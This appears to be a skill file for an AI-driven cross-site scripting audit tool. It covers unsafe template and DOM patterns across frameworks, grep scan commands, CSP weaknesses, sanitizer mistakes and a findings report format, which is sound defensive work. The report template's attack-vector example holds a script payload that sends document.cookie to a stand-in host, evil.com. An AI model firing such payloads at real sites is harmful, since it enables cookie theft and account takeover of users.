---
name: xss-detector
description: >
  Cross-Site Scripting (XSS) vulnerability detector for web applications. Identifies
  reflected XSS, stored XSS, DOM-based XSS, and mutation XSS patterns across JavaScript,
  TypeScript, PHP, Python web frameworks (Django, Flask), Ruby on Rails, and Java.
  Checks both server-side template rendering and client-side DOM manipulation.
  Activate when the user asks to "find XSS", "check for cross-site scripting",
  "XSS audit", "DOM XSS", or "sanitize output".
triggers:
  - "find XSS"
  - "cross-site scripting"
  - "XSS audit"
  - "DOM XSS"
  - "sanitize output"
  - "unsafe innerHTML"
  - "reflected XSS"
  - "stored XSS"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
---

# XSS Detector — Cross-Site Scripting Vulnerability Scanner

> Systematically identifies XSS vulnerabilities across server-side templates,
> JavaScript/TypeScript frontend code, and API response handling.
> Every finding includes the attack vector, payload example, and remediation.

---

## XSS Taxonomy

| Type | Trigger | Persistence | Impact |
|---|---|---|---|
| **Reflected** | URL parameter rendered in response | None — per-request | Cookie theft, redirect |
| **Stored** | User input saved to DB, rendered for others | Persistent | Account takeover |
| **DOM-based** | Client-side JS reads from URL/storage, writes to DOM | None | Cookie theft |
| **Mutation XSS (mXSS)** | Browser parser reinterprets sanitized HTML | Varies | Bypasses sanitization |

---

## Phase 1 — Server-Side Template Rendering

### Python (Django, Flask, Jinja2)

**Dangerous patterns:**
```python
# Django — disabling autoescaping
{% autoescape off %}{{ user_input }}{% endautoescape %}
{{ user_comment|safe }}           # safe filter bypasses escaping
{{ user_comment|mark_safe }}      # same risk

# Jinja2 / Flask
{{ user_input | safe }}
Markup(user_input)                # marks string as safe HTML
render_template_string(user_tpl)  # SSTI risk if user-controlled

# Python string formatting into HTML
f"<div>{user_name}</div>"         # no escaping
"<p>" + request.args['q'] + "</p>"
```

**Safe patterns (and caveats):**
```python
# Django — autoescaping is enabled by default in templates ✓
{{ user_input }}                   # automatically HTML-escaped

# Flask / Jinja2 — SAFE ONLY IF autoescaping is verified in the environment:
# ⚠️ CAUTION: Standalone Jinja2 disables autoescape by default (autoescape=False)!
# Flask only enables autoescape for .html, .htm, .xml, .xhtml templates by default.
# Custom templates (.svg, .js, .txt) or custom Jinja Environment(autoescape=False) DO NOT escape.
{{ user_input }}                   # safe ONLY when select_autoescape is active or autoescape=True
```

**How to scan:**
```bash
# Check template escaping filters and raw markup
grep -rn "|safe\|mark_safe\|autoescape off\|Markup(" --include="*.py" --include="*.html" .
grep -rn "f\".*<.*{" --include="*.py" .
grep -rn '\"<.*\"\s*\+\s*' --include="*.py" .

# Audit Jinja2 Environment configuration for missing/disabled autoescape
grep -rn "jinja2\.Environment(" --include="*.py" .
grep -rn "autoescape\s*=\s*False" --include="*.py" .
grep -rn "select_autoescape" --include="*.py" .
```

### PHP

**Dangerous patterns:**
```php
// Direct echo without escaping — most common XSS
echo $_GET['q'];
echo $_POST['name'];
echo $user_comment;
print("<div>" . $_REQUEST['input'] . "</div>");

// printf with user input
printf("<b>Hello %s</b>", $_GET['name']);

// Unescaped template assignment
$output = "<span>" . $userInput . "</span>";
```

**Safe patterns:**
```php
// Use htmlspecialchars() with correct flags
echo htmlspecialchars($_GET['q'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
// Or htmlentities()
echo htmlentities($user_comment, ENT_QUOTES, 'UTF-8');
```

**How to scan:**
```bash
grep -rn "echo\s*\$_GET\|echo\s*\$_POST\|echo\s*\$_REQUEST\|echo\s*\$_COOKIE" --include="*.php" .
grep -rn "print\s*(\s*[\"']<" --include="*.php" .
grep -rn '"\s*\.\s*\$' --include="*.php" .   # string concat with variable
```

### Node.js (Express, with template engines)

**Dangerous patterns:**
```javascript
// EJS — unescaped output
<%- user_input %>          // unescaped (vs <%= which escapes)
<%- include(userPath) %>   // path traversal + XSS risk

// Pug — unescaped
p!= user_input             // != skips escaping (vs = which escapes)
| !{user_input}

// Handlebars — triple mustache
{{{ user_input }}}         // unescaped (vs {{ }} which escapes)

// res.send() with user input
res.send("<p>" + req.query.q + "</p>")
res.end(userInput)
```

**Safe patterns:**
```javascript
// EJS — always use escaped output
<%= user_input %>            // auto-escaped ✓
// Pug
p= user_input                // auto-escaped ✓
// Handlebars
{{ user_input }}             // auto-escaped ✓
```

**How to scan:**
```bash
grep -rn "<%-\|!=" --include="*.ejs" .
grep -rn "{{{\|p!=" --include="*.hbs" --include="*.pug" .
grep -rn "res\.send\s*(.*req\.\|res\.end\s*(.*req\." --include="*.js" --include="*.ts" .
```

### Ruby on Rails

**Dangerous patterns:**
```ruby
# raw() disables escaping
<%= raw user_comment %>
<%= user_input.html_safe %>          # marks as safe — dangerous

# ERB string interpolation into HTML
"<div>#{user_input}</div>".html_safe

# content_tag with unescaped content
content_tag(:div, params[:name].html_safe)
```

**Safe patterns:**
```ruby
# Default ERB escapes automatically ✓
<%= user_input %>            # auto-escaped in Rails
```

**How to scan:**
```bash
grep -rn "raw\s\|html_safe\|content_tag.*html_safe" --include="*.erb" --include="*.html.erb" --include="*.rb" .
```

### Java (JSP, Thymeleaf, Freemarker)

**Dangerous patterns:**
```java
// JSP — unescaped expression
<%= request.getParameter("q") %>    // unescaped
${param.q}                          // Expression Language — context dependent

// Thymeleaf — unescaped
th:utext="${userInput}"             // unescaped (vs th:text which escapes)

// Freemarker
${userInput?no_esc}                 // no_esc skips escaping
```

**Safe patterns:**
```java
// JSP — use JSTL
<c:out value="${param.q}" />        // auto-escaped ✓
// Thymeleaf
th:text="${userInput}"              // auto-escaped ✓
```

---

## Phase 2 — DOM-Based XSS (Client-Side)

### Dangerous DOM Sinks

These JavaScript operations inject into the DOM without sanitization:

```javascript
// innerHTML — most common DOM XSS sink
element.innerHTML = userInput
element.innerHTML = location.hash.slice(1)
element.innerHTML = document.location.search

// outerHTML
element.outerHTML = userInput

// document.write / writeln
document.write(location.search)
document.writeln("<p>" + getParam("q") + "</p>")

// insertAdjacentHTML
element.insertAdjacentHTML("beforeend", userInput)

// eval and similar
eval(userInput)
setTimeout(userInput, 0)         // string-form setTimeout
setInterval(userInput)
Function(userInput)()
new Function(userInput)

// jQuery sinks
$(userInput)                     // unsafe jQuery selector
$("div").html(userInput)
$("div").after(userInput)
$.parseHTML(userInput)

// URL-based sinks
location.href = userInput        // open redirect + XSS via javascript:
location = "javascript:" + x
```

### Dangerous DOM Sources

These read attacker-controlled data:

```javascript
// URL-based sources
document.URL
document.documentURI
document.location
location.href
location.search
location.hash
location.pathname

// Storage-based sources
localStorage.getItem("userPref")   // if data was set from URL
sessionStorage.getItem("data")

// PostMessage (cross-origin)
window.addEventListener("message", (e) => {
    div.innerHTML = e.data         // no origin check!
})

// Referrer
document.referrer
```

**How to scan:**
```bash
# innerHTML sinks
grep -rn "\.innerHTML\s*=" --include="*.js" --include="*.ts" .

# document.write
grep -rn "document\.write\|document\.writeln" --include="*.js" --include="*.ts" .

# eval sinks
grep -rn "eval(\|setTimeout(\s*['\"`]\|setInterval(\s*['\"`]" --include="*.js" --include="*.ts" .

# URL sources flowing to sinks
grep -rn "location\.\|document\.URL\|document\.referrer" --include="*.js" --include="*.ts" .

# insertAdjacentHTML
grep -rn "insertAdjacentHTML" --include="*.js" --include="*.ts" .

# jQuery sinks
grep -rn '\.html(\|\.append(\|\.after(\|\.before(\|\.prepend(' --include="*.js" .
```

---

## Phase 3 — Content Security Policy (CSP) Analysis

### Check for CSP Header

```bash
# In server code
grep -rn "Content-Security-Policy\|contentSecurityPolicy" \
    --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" --include="*.java" --include="*.go" .

# In HTML meta tags
grep -rn "http-equiv.*Content-Security-Policy" \
    --include="*.html" --include="*.ejs" --include="*.erb" --include="*.pug" .
```

### CSP Weaknesses That Allow XSS Bypass

| Weakness | Example | Risk |
|---|---|---|
| `unsafe-inline` in script-src | `script-src 'self' 'unsafe-inline'` | Allows inline scripts — defeats CSP |
| `unsafe-eval` in script-src | `script-src 'self' 'unsafe-eval'` | Allows eval — bypasses CSP |
| Wildcard in script-src | `script-src *` | No allowlist — useless |
| Missing default-src | No fallback | Unspecified resources allowed |
| `data:` URI allowed | `script-src data:` | Allows data URI scripts |
| Overly broad CDN allowlist | `cdnjs.cloudflare.com` | Attacker-hosted scripts on CDN bypass |

### Recommended Minimal CSP

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}';
  style-src 'self' 'nonce-{RANDOM_NONCE}';
  img-src 'self' data: https:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

---

## Phase 4 — Sanitization Library Audit

### Checking for Sanitization

```bash
# Look for sanitization library usage
grep -rn "DOMPurify\|sanitize-html\|xss\|bleach\|html_sanitize" \
    --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" .
```

### Common Sanitization Mistakes

```javascript
// DOMPurify — correct usage
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean  // ✓

// WRONG: sanitize after insertion
element.innerHTML = userInput       // XSS happens here
element.innerHTML = DOMPurify.sanitize(element.innerHTML)  // too late

// WRONG: DOMPurify bypassed by using script sinks
const clean = DOMPurify.sanitize(userInput)
eval(clean)     // DOMPurify removes <script> but eval still dangerous

// sanitize-html — check allowed tags/attributes config
sanitizeHtml(userInput, {
    allowedTags: ["script"]  // WRONG — never allow script
    allowedAttributes: { "*": ["onload", "onerror"] }  // WRONG — event handlers
})
```

---

## Output Format

````markdown
## [SEVERITY] XSS-[NNN]: [XSS Type] in [Component/Route]

**Type:** Reflected | Stored | DOM-based | mXSS
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**Framework:** [Django/Express/PHP/Rails/etc.]

### Location
- **File:** `path/to/template.html:LINE` or `path/to/handler.js:LINE`
- **Route/Endpoint:** `GET /search?q=`

### Vulnerable Code
```[lang]
[exact vulnerable code snippet]
```

### Attack Vector
An attacker can send:
`https://app.example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`

This results in the script executing in the victim's browser, allowing cookie theft.

### Impact
[Cookie theft / session hijacking / account takeover / phishing / defacement]

### Remediation
```[lang]
[safe replacement code with escaping or sanitization]
```

### CSP Mitigates?
[Yes — nonce-based CSP would block this | No — unsafe-inline present | Partial]
````

---

## XSS Prevention Reference

### Server-Side
| Framework | Default | Safe Method | Unsafe Method |
|---|---|---|---|
| Django | Auto-escape | `{{ x }}` | `{{ x\|safe }}` |
| Jinja2/Flask | Auto-escape | `{{ x }}` | `{{ x\|safe }}`, `Markup()` |
| Rails | Auto-escape | `<%= x %>` | `<%= raw x %>`, `.html_safe` |
| Express/EJS | Manual | `<%= x %>` | `<%- x %>` |
| PHP | Manual | `htmlspecialchars($x)` | `echo $x` |
| Java Thymeleaf | Auto-escape | `th:text` | `th:utext` |

### Client-Side Safe Methods
```javascript
// Use textContent instead of innerHTML for plain text
element.textContent = userInput  // ✓ — no HTML parsing
// Use createElement for building HTML
const div = document.createElement('div')
div.textContent = userInput      // ✓
// Use DOMPurify for rich HTML
element.innerHTML = DOMPurify.sanitize(richInput)  // ✓
```

---

## Rules of Engagement

1. **Test all three XSS types** — reflected, stored, and DOM-based.
2. **Check the actual rendering context** — attribute, tag body, JavaScript string, URL, CSS.
3. **Framework-specific** — escaping rules differ by framework and context.
4. **CSP is defense-in-depth** — its absence doesn't create XSS, but its presence doesn't fix it.
5. **Include payload** — provide a conceptual XSS payload to prove exploitability.
6. **Distinguish false positives** — auto-escaped output that looks unescaped is safe.
